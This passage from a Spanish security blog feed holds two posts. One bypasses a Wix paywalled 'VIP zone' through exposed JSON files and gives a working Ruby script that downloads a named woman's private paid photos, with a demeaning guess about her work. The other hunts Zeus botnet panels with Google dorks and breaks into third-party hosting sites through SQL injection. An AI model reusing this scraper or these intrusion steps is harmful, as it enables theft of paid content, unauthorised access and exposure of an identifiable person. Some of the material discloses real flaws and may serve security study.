/></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Como todo especialista en seguridad informática, no podia retirarme de este sitio sin probar un poco su privacidad, intente algunos SQLI y uno q otro XSS sin resultado.<br /><br />Luego decidí enumerar los directorios del sitio con algún crawler con el fin encontrar, sin exito, algo interesante. <b>(nada relevante algunas carpetas publicas de contenido css, js. images)</b><br /><br />En este punto ya algo cansado 6.30 am, estaba por renunciar... me levante me senté en la cama y vi mi laptop diciedome... <b>"antes solías escribir en un blog... como se llamaba? sec...cuanto?"</b></div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">Esta terrible imagen me dio fuerzas para continuar en mi busqueda, presentía que algo se me estaba escapando!</div><div style="text-align: left;"><b><br /></b></div><div style="text-align: left;">En este punto, comencé a evaluar la seguridad en capa de comunicaciones, el formulario que me solicitaba acceso debía enviar los parametros a algún lado para realizar la validación y responderme el ya odiado "contraseña incorrecta".</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Inicie HTTP Live Headers... y envíe el formulario a la espera de encontrar la ruta del fichero que realizaba la validación y seguir mi análisis por aquellos rumbos.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-hU30Mj_N1Q8/Vapw9nzGIBI/AAAAAAAAAq8/nox3bFAhRCI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A29%253A31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="358" src="http://4.bp.blogspot.com/-hU30Mj_N1Q8/Vapw9nzGIBI/AAAAAAAAAq8/nox3bFAhRCI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A29%253A31.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Sorprendentemente la validación se realizaba con alguna función del lado del cliente, o lo que es lo mismo con Javascript!&nbsp;<b>(no me voy a cansar de decirlo nunca! estamos en el siglo XXI, validemos del lado del servidor, POR FAVOR)</b><br /><div style="text-align: left;"><br /></div><div style="text-align: left;">Puse manos a la obra y comencé a revisar el html+js de la vista principal, pero este estaba realmente sucio como forma de protección y utilizaba una suerte de reactive.js + angular.js todo sumamente minificado.</div><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-fTYmEtkzDn8/VapyNH5NwEI/AAAAAAAAArE/dbOIBYSC28c/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A34%253A52.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="298" src="http://4.bp.blogspot.com/-fTYmEtkzDn8/VapyNH5NwEI/AAAAAAAAArE/dbOIBYSC28c/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A34%253A52.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Mucho de los parametros del html eran generados por alguna función aleatoria, con el objetivo de complicar la lectura del código <b>(medida de seguridad)</b>.<br /><div><br /></div><div>Luego de revisar un poco el código e intentar deducir en profundidad que estaba pasando en el sitio, decidí investigar un poco en que estaba desarrollado el sitio, donde se albergaba y leer un poco de la documentación oficial de los creadores de la plataforma, con el fin de cerrar unas cuantas ideas que tenia dando vuelta en mi cabeza.<br /><br />El sitio esta montado en un servicio bastante conocido que se llama WIX, el mismo ofrece una plataforma para crear en base a distintos tipos de plantillas un sitio web custom, escalable y seguro, para desarrolladores y no desarrolladores. <b>(Una solución similar a Wordpress y Blogger).</b></div><div><b><br /></b></div><div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-VHJgYjT1Fig/Vap09FlOFBI/AAAAAAAAArY/J41FQZ0aSfU/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A46%253A24.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="312" src="http://2.bp.blogspot.com/-VHJgYjT1Fig/Vap09FlOFBI/AAAAAAAAArY/J41FQZ0aSfU/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A46%253A24.png" width="640" /></a></div><br />WIX:&nbsp;<a href="http://es.wix.com/">http://es.wix.com/</a><br />El sitio permite acceder a distintos tipos de plugins en su apartado privado en el cual cobran dependiendo el plan necesitado.<br /><br />El plugin de ZONAS PREMIUMS/VIP de WIX resulta estar incluido en un paquete privado y de costo <b>6 USD </b>mensuales, lo que implica que muy probablemente nuestra profesora de MMA este pagando por el servicio de <b>WIX </b>el cual garantiza brindar un servicio seguro por el precio establecido.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-9jBqEob8vpE/Vap0plBf4SI/AAAAAAAAArQ/_H7kGrErna0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A45%253A24.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="254" src="http://3.bp.blogspot.com/-9jBqEob8vpE/Vap0plBf4SI/AAAAAAAAArQ/_H7kGrErna0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A45%253A24.png" width="640" /></a></div><div style="text-align: center;"></div><br />Para mi suerte la documentación de WIX es muy extensa y luego de leer bastante comprendí que su sistema de generación de plantillas dinámicas, esta regida por un muy extenso API, que permite desde gestionar archivos, hasta crear estilos css dinamicos, manteniendo toda la información fuera del servidor principal.<br /><br /><b>WIX DOCUMENTATION CENTER: </b><a href="http://dev.wix.com/docs/">http://dev.wix.com/docs/</a><br /><br /><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Luego de esto no me quedaba dudas, de que el sitio: <a href="http://pamelagaldos.com.ar/">http://pamelagaldos.com.ar</a>&nbsp;estaba solicitando los datos aleatorios por medio de peticiones ajax a un API RESTFull.<br /><br />En este punto mi objetivo cambio, y decidí buscar en el sitio, la función (clase,controlador,etc) que contenía las BaseURLs del servidor de WIX para ver que sucedía.<br /><br />Al poco tiempo de buscar encontré embebido dentro de unos tags &lt;script&gt;&lt;/script&gt; algo que hacia referencia a servidores externos:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-dYglXO811GA/Vap3VcctLDI/AAAAAAAAArk/EMLqJ_cHBXY/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A56%253A50.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="238" src="http://2.bp.blogspot.com/-dYglXO811GA/Vap3VcctLDI/AAAAAAAAArk/EMLqJ_cHBXY/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B12%253A56%253A50.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Podemos ver como dentro de este script se hace referencia a serverName y alguna que otra ruta */services/* lo que prometía contener solicitudes ajax a revisar.<br /><br />El problema estaba en que el código se encontraba minificado y su lectura logica era imposible debido a la cantidad de lineas del script.<br /><br />Por suerte existe una solución que permite "revertir" el proceso de minificación, lo coloco entre comillas ya que es mas bien una reestructuración del codigo. (La minificación de js implica varias cosas mas que solo reducir todo a una linea, el proceso también genera variables random y reduce nombre de funciones a letras del abecedario, etc);</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Para convertir el código ilegible a algo un poco mas coherente utilice:&nbsp;<a href="http://jsbeautifier.org/">http://jsbeautifier.org/</a>&nbsp;</div><div style="text-align: left;">Una joya en el análisis de javascript minificado.<br /><br />Como resultado obtuve un largo archivo javascript estructurado con nombres de funciones y variables poco descriptivas, luego de leer y releer bastante el código llegue a lago interesante:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-VZbZG2mL2Wo/Vap5umYteHI/AAAAAAAAArw/qwdUPwYvIts/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A07%253A05.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="248" src="http://1.bp.blogspot.com/-VZbZG2mL2Wo/Vap5umYteHI/AAAAAAAAArw/qwdUPwYvIts/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A07%253A05.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Dentro del código existian algunos objetos json que tenian propiedades enbebidas que se correspondian con los elementos html del sitio.<br /><br /><b>c1flq:&nbsp;</b>correspondia al <b>id</b> del button ZONA VIP</div><div><b>title: </b>correspondia al value del button<br />y... <b>urls: </b>contenian algunas direcciones con extension <b>json! </b>probablemente conteniendo información necesaria para cada una de las zonas privadas!<br /><br /><b>Mi pregunta era... que habra en este json? el hash para compara la contraseña del form? datos bobos? información de configuración? era hora de visitarlos!</b><br /><br />en mi caso elegí realizar las pruebas con el API respectiva a una galería de la Zona VIP.<br /><br /><a href="http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json">http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json</a></div><div><br /></div><div>El API nos devuelve un array enorme de información en la cual se destaca el objeto JSON <b>"data"</b>,</div><div>el cual contiene toda la información necesaria para renderizar la vista privada de una galeria de la Zona VIP, incluyendo las imagenes y el hash de acceso:<br /><br /><div class="separator" style="clear: both; text-align: left;"><a href="http://4.bp.blogspot.com/-iLFUcmg8Irk/Vap8Sxde__I/AAAAAAAAAr8/RYGQ4SaqhcI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A18%253A04.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="76" src="http://4.bp.blogspot.com/-iLFUcmg8Irk/Vap8Sxde__I/AAAAAAAAAr8/RYGQ4SaqhcI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A18%253A04.png" width="640" /></a></div><div style="text-align: center;"><br /></div></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-GTmLbNL7_GQ/Vap8g1dM1uI/AAAAAAAAAsE/GdoIboOkRZ8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A19%253A00.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="268" src="http://1.bp.blogspot.com/-GTmLbNL7_GQ/Vap8g1dM1uI/AAAAAAAAAsE/GdoIboOkRZ8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A19%253A00.png" width="640" /></a></div><div><br /></div><br /><div style="text-align: left;"><b>passwordDigest: </b>el hash con el que se compara nuestra contraseña luego de algun proceso de hasheo</div><div style="text-align: left;"><b>image_119n: </b>el objeto json imagen, con el nombre aleatorio actual, de nuestra ansiada imagen privada.<br /><br />Con el nombre de la imagen secreta, solo bastaba encontrar el path donde estaban subidas las imagenes, para esto analizamos un poco mas el codigo del index, buscando los enlaces hacia las imagenes.</div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-XVQ8oulFHWs/Vap9b5scF5I/AAAAAAAAAsM/Nof0Z2A8ZSg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A22%253A58.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="42" src="http://3.bp.blogspot.com/-XVQ8oulFHWs/Vap9b5scF5I/AAAAAAAAAsM/Nof0Z2A8ZSg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A22%253A58.png" width="640" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Al parecer los archivos son hosteados en otro servidor de wix, funcionando en la url:<br /><span style="background-color: white; color: #222222; font-family: 'dejavu sans mono', monospace; font-size: 11px; white-space: pre-wrap;"><br /></span></div><b><a href="http://static.wixstatic.com/media/:image">http://static.wixstatic.com/media/:image</a></b></div><div><br /></div><div>Con esta ruta solo nos faltaba agregarle al final el nombre de nuestra imagen privada!<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-I8-0VefUSdw/Vap-OaVR6gI/AAAAAAAAAsY/LHJOCog9EA0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A25%253A54.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="476" src="http://1.bp.blogspot.com/-I8-0VefUSdw/Vap-OaVR6gI/AAAAAAAAAsY/LHJOCog9EA0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2015-07-18%2B13%253A25%253A54.png" width="640" /></a></div><div style="text-align: center;"><br /></div></div><div>Definitivamente nuestra profesora de MMA no solo pelea, sino que probablemente sea SCORT VIP de Bs As.<br /><br />En este punto todo mi día cobro sentido, estar desarrollando un sistema de cryptografía para securizar un API JSON pensando que mi nivel de paranoia estaba llegando a un punto critico, y luego encontrarse con la posibilidad de evitar un sistema de autentificación de un sitio que factura por garantizar la seguridad de los datos y negocios de los clientes, debido a que WIX no securizo y encripto los datos que viajaban por su API, me dio escalofrios.<br /><br />En fin aquí se ven dos problemas grandes de seguridad y el mayor afectado es Pamela!<br /><br />Ella cobra $100 por &nbsp;que sus clientes puedan acceder a sus imagenes HOT, y WIX le cobra $60 por un servicio inseguro que permite a terceros obtener todas las fotos de Pamela sin pagar un centavo...<br />Algo no cuadra... WIX se lleva mas del 50% de las ganancias de PAMELA sin contar los daños y perjuicios laborales que le produce a Pamela que alguien venga y vea sus fotos gratis!!!<br /><br />Alguien pensara que estoy exagerando, y para demostrar lo contrario me propuse desarrollar un script que descargara todas las fotos privadas de PAMELA &nbsp;de su Zona VIP sin pagar un centavo.<br /><br />Y como hace mucho q no jugaba con mi amigo Ruby hoy le toco a el:<br /><br />CODE<br /><br /><pre class="brush: ruby">#Esta herramienta ha sido creada con fines educativos,<br />#SecuritySignal no se hace responsable por el uso indebido de la misma.<br />require 'json'<br />require 'rest-client'<br />baseImageUrl = "http://static.wixstatic.com/media/"<br />apis = [<br />    "http://static.wixstatic.com/sites/b4dc37_a051c9896b38484b0af98d41c78aad95_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_a051c9896b38484b0af98d41c78aad95_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_a051c9896b38484b0af98d41c78aad95_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_a26927faf95266eb3e90539795f911c7_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_a26927faf95266eb3e90539795f911c7_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_a26927faf95266eb3e90539795f911c7_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_9970654c91ff1e68cb136b2facf02541_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_e0b5e6e39a8f34d38d52cb117145b7a2_70.json.z?v=3", <br />    "http://staticorigin.wixstatic.com/sites/b4dc37_e0b5e6e39a8f34d38d52cb117145b7a2_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_e0b5e6e39a8f34d38d52cb117145b7a2_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_c453d26b8f1ad045815c326852f6ed9e_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_c453d26b8f1ad045815c326852f6ed9e_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_c453d26b8f1ad045815c326852f6ed9e_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_65b4d7c00981596fedcc0b29630dbd63_70.json.z?v=3", <br />    "http://staticorigin.wixstatic.com/sites/b4dc37_65b4d7c00981596fedcc0b29630dbd63_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_65b4d7c00981596fedcc0b29630dbd63_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_94e133e7bdb916e1edcac338cae838e5_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_94e133e7bdb916e1edcac338cae838e5_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_94e133e7bdb916e1edcac338cae838e5_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_55de87fc383d68f53ad84448181dccfa_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_55de87fc383d68f53ad84448181dccfa_70.json.z?v=3", <br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_55de87fc383d68f53ad84448181dccfa_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_a50043065395619bbe15c4545cabe038_70.json.z?v=3",<br />    "http://staticorigin.wixstatic.com/sites/b4dc37_a50043065395619bbe15c4545cabe038_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_a50043065395619bbe15c4545cabe038_70.json",<br />    "http://static.wixstatic.com/sites/b4dc37_edb132d4be40dee794296337c610f8f5_70.json.z?v=3", <br />    "http://staticorigin.wixstatic.com/sites/b4dc37_edb132d4be40dee794296337c610f8f5_70.json.z?v=3",<br />    "http://fallback.wix.com/wix-html-editor-pages-webapp/page/b4dc37_edb132d4be40dee794296337c610f8f5_70.json",<br />]<br /><br />jsonObjects = [];<br /><br />apis.each { |apiUrl|<br /> begin<br />   response = RestClient.get apiUrl<br />   jsonObjects.push(JSON.parse(response))<br /> rescue =&gt; e<br />   e.response<br /> end<br />  <br />}<br /><br />jsonObjects.each_with_index { |obj, i|<br />  obj['data']['document_data'].each { |data|<br />    data.each { |url|<br />      if(url['uri'])<br />        File.open('./images/'+url['uri'], 'w') do |file|<br />          response = RestClient.get baseImageUrl+url['uri']<br />          file.puts response;<br />        end<br />        puts url['uri'];<br />      end<br />    }<br />  }<br />}<br /><br /></pre><div style="text-align: right;"><b>Saludos! </b></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Cazador de Botnets: [Zeus]]]></title>
    <link href="http://securitysignal.github.io/blog/2015/07/09/cazador-de-botnets-zeus/"/>
    <updated>2015-07-09T15:20:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/07/09/cazador-de-botnets-zeus</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-1eQg62wJHX0/VZ7s98FDEbI/AAAAAAAAAps/5vY8cFLVzu0/s1600/cazador.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="320" src="http://1.bp.blogspot.com/-1eQg62wJHX0/VZ7s98FDEbI/AAAAAAAAAps/5vY8cFLVzu0/s320/cazador.jpg" width="240" /></a></div><div style="text-align: right;"><b>&nbsp;By [Q]3rV[0]</b></div><br />Quien no fantaseo alguna vez con tener miles y miles de ordenadores bajo su poder?, no me refiero con el objetivo de desatar un caos o incluso robar masivamente información, sino para simplemente, tener el profundo sentimiento de <b>"control"</b>. O hablando desde el otro <b>"lado"</b> a quien no se le ocurrio la idea de <b>desbaratar botnets</b> alguna vez?, cazarlas<br /><a name='more'></a>por el simple echo de ver que ahí adentro, descubrir el numero de&nbsp; maquinas que cayeron bajo su poder? y quizá hasta tomar el control?. Bueno, este post va dedicado a esta ultima fantasía.<br /><br /><h2 style="text-align: left;">Como encontramos una botnet?</h2><br />Vamos a lo primero, para cazar una botnet hay que localizarla, existen diversos servicios online que se dedican al traceo de estas, en los que se publican el <b>path del C&amp;C</b>,<b> información de los ejecutables usados para la infección</b>, <b>el tipo de botnet</b>, etc. <br /><br /><h3 style="text-align: left;">&nbsp;Cybercrime-tracker </h3><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-hY4K4bwm-ZM/VZm3TAqPJqI/AAAAAAAAAlc/Mi293JstXIw/s1600/2.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://2.bp.blogspot.com/-hY4K4bwm-ZM/VZm3TAqPJqI/AAAAAAAAAlc/Mi293JstXIw/s1600/2.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;"><a href="http://cybercrime-tracker.net/">Cybercrime-Tracker</a></td></tr></tbody></table><br />La cual mantiene archivado una gran diversidad de malware como la botnet <b>Blackhole</b>, <b>Citadel</b>, <b>Zeus</b>, <b>Pony</b>, <b>IceIX</b>, <b>VertexNet</b> entre otras.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-kqdFOuCuNp8/VZm3qq9WrvI/AAAAAAAAAlk/3YPc9w_301I/s1600/3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-kqdFOuCuNp8/VZm3qq9WrvI/AAAAAAAAAlk/3YPc9w_301I/s1600/3.png" /></a></div><br /><h3 style="text-align: left;">&nbsp;</h3><h3 style="text-align: left;">Abuse.ch</h3><h3 style="text-align: center;"></h3>Otra de gran utilidad es <a href="http://abuse.sh/">abuse.ch</a> contando con un tracker para la <b>Zeus</b>, <b>Feodo</b>, <b>Palevo</b> y la <b>SpyEye</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-hzT8MRbaLxo/VZm45aL5rdI/AAAAAAAAAl0/1Zb-rjHL9pk/s1600/4.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://2.bp.blogspot.com/-hzT8MRbaLxo/VZm45aL5rdI/AAAAAAAAAl0/1Zb-rjHL9pk/s1600/4.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;"><a href="https://zeustracker.abuse.ch/">Zeus-Tracker</a></td></tr></tbody></table><br />Posiblemente existan otras listas de botnets, pero por el momento son las unicas que conozco.<br /><br />También podemos hacer uso de algún <b>motor de búsqueda como google</b>. Implementando uno que otro <b>google dork</b> llevándonos por las estructura del panel que deseemos localizar, por ejemplo, la ruta del C&amp;C por defecto en la botnet <b>Zeus</b> es el siguiente: <b>/cp.php?m=login</b>.<br /><br /><br /><pre class="brush: bash">inurl:/cp.php?m=login </pre><br />De ahí en mas podríamos ir variando, ya que probablemente el responsable haya echo algunas modificaciones al script, incluso cambiado el nombre, en fin todo va en el ensayo y error. Tal vez nos topemos con alguna que otra semi camuflada.<br /><br /><br /><pre class="brush: bash">inurl:/adm.php?m=login</pre><br /><br /><pre class="brush: bash">intext:"Remember (MD5 cookies)" ext:php</pre><br /><br /><h2 style="text-align: left;">Hosting1</h2>Partamos por el punto de que una botnet puede estar montada en un:<br /><br /><ul><li>Servicio de hosting free</li><li>Servicio de hosting pago</li><li>Hosting hacked</li><li>VPS </li></ul><br />En mi caso se hallaba alojada en lo que parecía ser un servicio de hosting pago, llamémoslo <b>hosting1.com</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-ppnAS092r7o/VZnCQDmQL9I/AAAAAAAAAmE/zA88ywMxQDc/s1600/panel.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-ppnAS092r7o/VZnCQDmQL9I/AAAAAAAAAmE/zA88ywMxQDc/s1600/panel.png" /></a></div><br /><br />A simple vista me atrevía a decir que el encargado del malware obtuvo acceso ilícito, por lo que lo mas seguro es que la web presentara alguna que otra vulnerabilidad que me permitiese la entrada, si es que no fue parcheada por el atacante, para alejar a los curiosos.<br /><br />Realmente aun quedaba alguna que otra brecha.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-9y2f5vRWTTU/VZnDOtnMELI/AAAAAAAAAmM/dkXE44dp_sA/s1600/5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-9y2f5vRWTTU/VZnDOtnMELI/AAAAAAAAAmM/dkXE44dp_sA/s1600/5.png" /></a></div><br /><br />Fijémonos haber que hay detrás del panel.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-3tsAobvKvXU/VZnEKpzI06I/AAAAAAAAAmY/dSJtbBtep3I/s1600/6.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-3tsAobvKvXU/VZnEKpzI06I/AAAAAAAAAmY/dSJtbBtep3I/s1600/6.png" />&nbsp;</a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-bvSlokqzfJc/VZnEzXVQQMI/AAAAAAAAAmo/_IA-u-ULHXY/s1600/7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-bvSlokqzfJc/VZnEzXVQQMI/AAAAAAAAAmo/_IA-u-ULHXY/s1600/7.png" /></a></div><br />Un upload bastante jodido y otra <b>SQLI</b>. Luego de realizar varios intentos decidí dejar de lado la subida de ficheros, pero si podía inyectar comandos en la db, solo tenia que buscar la tabla con las credenciales de la botnet.<br /><br />&nbsp; <br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-zPQ_9kf4Ytk/VZmyvCP9BNI/AAAAAAAAAlQ/qUa0AHS_-UY/s1600/dbzeus.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://2.bp.blogspot.com/-zPQ_9kf4Ytk/VZmyvCP9BNI/AAAAAAAAAlQ/qUa0AHS_-UY/s1600/dbzeus.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Estructura de la db Zeus</td></tr></tbody></table><div style="text-align: center;"><br /></div><div style="text-align: left;">Por desgracia no había rastros de la Zeus.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-_hsefoDRhgs/VZ22VeF3hiI/AAAAAAAAAm8/XgIGnxYgZGs/s1600/db_materno.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-_hsefoDRhgs/VZ22VeF3hiI/AAAAAAAAAm8/XgIGnxYgZGs/s1600/db_materno.png" /></a></div><br /><br />Lo mas probable es que corra con un usuario diferente.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-VKzvAbWQ5r8/VZ3EVRwA8_I/AAAAAAAAAnk/B8QUsgWKjHs/s1600/user-db.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-VKzvAbWQ5r8/VZ3EVRwA8_I/AAAAAAAAAnk/B8QUsgWKjHs/s1600/user-db.png" /></a></div><br /><br />Después de navegar por la aplicación, me encontré con la zona de acceso a clientes.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-oF-n4bG8MI8/VZ23woRmRGI/AAAAAAAAAnI/wqUXclhnf68/s1600/acceso_clientes.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-oF-n4bG8MI8/VZ23woRmRGI/AAAAAAAAAnI/wqUXclhnf68/s1600/acceso_clientes.png" /></a></div><br /><br />Evidentemente trabajaba con otro user ya que las credenciales del formulario no estaban en la anterior base de datos. Así que me registre para ponerme en busca de alguna inyección u otra abertura que me de acceso.</div><div style="text-align: left;">Al rato termine por darme por vencido y decidí ir por otra via, enumerar los dominios en el servidor, tratar de acceder mediante alguno de ellos y así escalar hasta <b>hosting1.com</b>.<br /><br /><h2 style="text-align: left;">&nbsp;</h2><h2 style="text-align: left;">Evilnet</h2>El proveedor de hosting, llamémoslo <b>"Evilnet"</b>, por motivos obvios no voy a dar nombres. Evilnet ofrece servicio de hosting, diseño y programación web, varios dominios que pertenecen a Evilnet, <b>usan la misma estructura de CMS</b>, el mismo con el que corre nuestro <b>hosting1.com</b>&nbsp; por&nbsp; acá tenemos otro similar y por supuesto junto con la misma <b>SQLI</b> :)<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-kol3ojEHA-o/VZ2_y2Gvb-I/AAAAAAAAAnc/K8DQAueUXAg/s1600/login_hosting2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-kol3ojEHA-o/VZ2_y2Gvb-I/AAAAAAAAAnc/K8DQAueUXAg/s1600/login_hosting2.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"></div><br />Si no leíste el articulo <b>"Engañando al WAF con XMP"</b> podes ingresar al siguiente <a href="http://www.securitysignal.org/2015/05/enganando-el-waf-con-xmp.html">link</a> donde detallo como conseguí acceso al servidor mediante <b>hosting2.com</b>.<br /><br />Siguiendo con el apartado cabe destacar algo interesante que me encontré mediante la recolección de información:<br /><br /><ul><li>Ambas webs usan el mismo <b>password</b> en el formulario de administración.</li></ul><br /><ul><li>Ambas webs cuentan con el mismo <b>password</b> en la base de datos (el mismo que usan para acceder al panel, <b>no es joda!</b>). </li></ul><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a 